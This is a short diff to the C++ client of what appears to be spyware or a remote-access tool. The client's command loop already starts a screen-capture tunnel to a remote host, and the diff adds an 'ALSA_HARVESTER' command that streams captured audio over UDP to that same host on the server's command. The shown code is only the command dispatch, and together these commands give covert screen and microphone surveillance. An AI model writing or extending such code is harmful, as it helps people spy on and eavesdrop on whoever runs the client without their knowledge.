@@ -140,9 +140,18 @@ void Client::start() {
                             rc = -1;
                         }
                     } else if (command_code == SCREEN_HUNTER) {
-                        printf("[Client] Received SCREEN_HUNTER command");
+                        printf("[Client] Received SCREEN_HUNTER command\n");
                         clspy_tunnel = new CLScreenHunter();
                         rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
+                    } else if (command_code == ALSA_HARVESTER) {
+                        printf("[Client] Received ALSA_HARVESTER command\n");
+                        clspy_tunnel = new CLALSAHarvester();
+                        if (clspy_tunnel->init(ip_, port_ + command_arg, UDP_BASED) < 0 ||
+                            clspy_tunnel->udp_handshake() < 0
+                        ) {
+                            printf("[Client] Error initiating alsa_harvester\n");
+                            rc = -1;
+                        }
                     }
 
                     if (rc < 0) {
